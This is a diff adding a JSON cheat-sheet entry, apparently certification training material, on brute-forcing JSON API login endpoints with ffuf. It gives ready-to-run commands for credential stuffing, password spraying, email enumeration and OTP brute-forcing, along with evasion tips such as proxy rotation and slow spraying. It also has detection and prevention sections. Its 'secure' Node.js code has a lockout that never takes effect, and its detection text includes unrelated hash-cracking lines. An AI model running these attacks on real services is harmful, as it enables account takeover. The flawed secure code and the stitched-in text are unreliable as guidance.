@@ -1,0 +1,96 @@
+{
+  "id": "api-ffuf-json-bruteforce",
+  "name": "API Credential Brute-Force with ffuf (JSON Body)",
+  "command": "ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w <emails.txt>:EMAIL -u http://<target>/api/v1/authentication/<role>/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 100",
+  "platform": "linux",
+  "category": "Password Attacks",
+  "subcategory": "Credential Brute-Force",
+  "type": "command",
+  "description": "Brute-force REST API login endpoints that accept JSON bodies using ffuf's multi-wordlist mode. Use -fr to filter responses containing the failure string, keeping only successful logins. This is the API-native equivalent of form-based bruteforce — requires Content-Type: application/json and a JSON payload template.",
+  "notes": "-w <wordlist>:KEYWORD assigns a label; use the label in -d payload. -fr filters OUT responses matching the string (invalid creds message). -t 100 sets threads — reduce if rate-limited. Two-wordlist mode (email + password) does credential stuffing; single-wordlist with fixed email does password spray. Capture the JWT token from successful responses for follow-on exploitation. Check for account lockout before running at high thread count.",
+  "variations": [
+    {
+      "command": "ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<known_email>\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 50",
+      "caption": "Password spray against single known email address",
+      "label": "ffuf brute"
+    },
+    {
+      "command": "curl -X POST http://<target>/api/v1/authentication/customers/passwords/resets/email-otps -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\"}'\nffuf -u http://<target>/api/v1/authentication/customers/passwords/resets -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\", \"OTP\": \"FUZZ\", \"NewPassword\": \"NewP@ssw0rd1\"}' -w <(seq -w 0000 9999):FUZZ -t 50 -mr '\"SuccessStatus\":true'",
+      "caption": "OTP brute-force: trigger reset then immediately fuzz 4-digit OTP (0000-9999)",
+      "label": "POST request"
+    },
+    {
+      "command": "ffuf -w <emails.txt>:EMAIL -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"<common_pass>\"}' -fr \"Invalid Credentials\" -mc 200",
+      "caption": "Username/email enumeration with fixed password",
+      "label": "ffuf brute"
+    },
+    {
+      "command": "ffuf -w <wordlist.txt>:PASS -u http://<target>/api/v1/authentication/sign-in -X POST -H \"Content-Type: application/json\" -H \"Authorization: Bearer <jwt>\" -d '{\"currentPassword\": \"PASS\", \"newPassword\": \"NewPass1!\"}' -fr \"incorrect\" -t 30",
+      "caption": "Brute-force authenticated password-change endpoint",
+      "label": "ffuf brute"
+    }
+  ],
+  "examples": [
+    {
+      "command": "ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 100",
+      "caption": "CWES M18: credential stuffing against API sign-in with harvested email list"
+    }
+  ],
+  "tools": [
+    "ffuf"
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1110.001",
+    "T1110.004"
+  ],
+  "exam": "exam-ok",
+  "certifications": [
+    "CWES"
+  ],
+  "primary_cert": "CWES",
+  "source": "CWES Module 18: API Attacks",
+  "references": [
+    {
+      "title": "OWASP API Security Top 10 – API2:2023 Broken Authentication",
+      "url": "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    },
+    {
+      "title": "ffuf – Fuzz Faster U Fool",
+      "url": "https://github.com/ffuf/ffuf"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "auth-bruteforce-protection-bypass",
+      "rel": "prereq",
+      "note": "Check for rate limiting / lockout before launching"
+    },
+    {
+      "id": "auth-2fa-brute",
+      "rel": "next",
+      "note": "If MFA/OTP required after login, brute-force the OTP"
+    },
+    {
+      "id": "api-bola-sequential-enum",
+      "rel": "next",
+      "note": "Use captured JWT to enumerate other users' objects via BOLA"
+    }
+  ],
+  "defense": {
+    "why_it_works": "REST API login endpoints often accept JSON-encoded credentials and return distinct success/failure responses. ffuf's multi-wordlist mode (-w user_list:HFUZZ -w pass_list:PFUZZ) allows credential stuffing or password spraying by injecting username/password pairs into a JSON body template. Traditional form-based brute-force tools miss these endpoints because they send application/x-www-form-urlencoded; JSON bodies require explicit Content-Type: application/json and a template that builds valid JSON.",
+    "prerequisites": "API login endpoint accepting JSON. Username list and password list (or credential pairs from breach data). ffuf installed. No account lockout or CAPTCHA on the endpoint. Endpoint returns distinct success/failure indicators (HTTP status code or response body string).",
+    "impact": "T1110.001 Brute Force: Password Guessing + T1110.004 Credential Stuffing. Successful login as any account in the target list. API accounts often have elevated permissions (service accounts, admin tokens). Compromised API credentials may grant access to backend services not exposed at the web layer.",
+    "detection": "High-rate POST requests to /api/*/login or /api/*/auth with identical Content-Type from a single IP. Failed authentication event spikes in application logs. WAF rule: more than N failed auths from same source IP in M seconds. ffuf default User-Agent ('Fuzz Faster U Fool') in HTTP headers. JSON body pattern analysis: same structure, varying username/password fields. SIEM alert: auth_failed > 10 in 60s per source IP.\nHash-cracking tools (john, hashcat) running after credential dump + high CPU/GPU from unsigned binaries accessing password hash files (DET0105).\nSudden valid logins from previously-dumped accounts correlating with cracking timeline.\nOffline cracking inferred from subsequent successful CLI/web auth to routers/switches from dumped accounts.",
+    "artifacts": "Web server access log: high-rate POST /api/v1/login 401s from single IP | Application auth log: multiple failed_login events | WAF blocked events on auth endpoint | Network capture: repeated JSON POST bodies with varying credentials",
+    "prevention": "Implement account lockout (or progressive delays) after N failed attempts. Use CAPTCHA or proof-of-work on login endpoints. Rate-limit per IP and per username (credential stuffing uses distributed IPs). Require MFA for API authentication. Use short-lived JWTs and refresh token rotation — limits the value of stolen credentials. Log and alert on failed authentication spikes. Detect and block ffuf User-Agent. Use OAuth2 / client credential flow with secret rotation instead of username/password on API-to-API calls.",
+    "evasion": "Rotate source IPs (residential proxy pool) to bypass per-IP rate limits. Change User-Agent to mimic legitimate browser. Slow spray (1 attempt/minute/account) to stay under lockout thresholds. Target endpoints without auth — /api/v2/login may lack controls added to /api/v1/login.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1110/001/",
+      "https://attack.mitre.org/techniques/T1110/004/"
+    ],
+    "misconfiguration": "No rate-limiting on the authentication endpoint. No account lockout policy. Default or missing security headers (no CAPTCHA, no bot detection). API login endpoint not differentiated from regular endpoints in WAF rules. JSON body accepted without validation — any field combination tried. Auth failure response reveals whether username exists (user enumeration via different error messages).",
+    "vulnerable_config": "# Node.js — no rate-limit, no lockout:\napp.post('/api/v1/login', async (req, res) => {\n  const { username, password } = req.body\n  const user = await db.query('SELECT * FROM users WHERE username=?', [username])\n  if (!user) return res.status(401).json({error: 'Invalid username'})  // VULN: username enumeration\n  if (!bcrypt.compareSync(password, user.password_hash))\n    return res.status(401).json({error: 'Invalid password'})  // VULN: different error = username valid\n  res.json({ token: generateJWT(user) })  // VULN: unlimited attempts\n})\n\n# No WAF rule for auth endpoint\n# No CAPTCHA\n# No MFA required",
+    "secure_config": "# Node.js — rate-limited, locked, constant-time response:\nconst rateLimit = require('express-rate-limit')\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,  // 15 min window\n  max: 10,                     // 10 attempts per IP per window\n  standardHeaders: true,\n  legacyHeaders: false,\n  message: { error: 'Too many attempts, try again later' }\n})\napp.post('/api/v1/login', loginLimiter, async (req, res) => {\n  const { username, password } = req.body\n  const user = await db.query('SELECT * FROM users WHERE username=?', [username])\n  // SAFE: same error and same timing whether username exists or not\n  const valid = user && await bcrypt.compare(password, user.password_hash)\n  if (!valid) {\n    await bcrypt.hash('dummy', 10)  // constant-time even if user not found\n    return res.status(401).json({ error: 'Invalid credentials' })  // generic message\n  }\n  // Check failed attempts and enforce lockout\n  if (user.failed_attempts >= 5) return res.status(423).json({ error: 'Account locked' })\n  res.json({ token: generateJWT(user) })\n})\n\n# WAF rule (nginx + ModSecurity or AWS WAF):\n# Rate-limit /api/v1/login to 10 req/min per IP\n# Block User-Agent containing 'ffuf' or 'python-requests' on auth endpoints"
+  }
+}
